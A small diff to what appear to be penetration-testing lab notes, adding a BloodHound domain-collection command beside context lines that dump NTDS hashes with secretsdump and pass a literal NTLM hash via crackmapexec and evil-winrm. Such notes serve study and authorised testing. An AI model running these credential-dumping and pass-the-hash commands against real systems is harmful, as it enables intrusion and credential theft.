@@ -1052,7 +1052,8 @@ impacket-secretsdump - ntds ntds.dit - system SYSTEM LOCAL
 crackmapexec winrm 192.168.124.175 -u users -H hashesh
 evil-winrm -i 192.168.124.175 -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
 
-# PowerUp
+# SharpHOund
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\L.Livingstone\Desktop -OutputPrefix test
 ```
 
 ### Nagoya
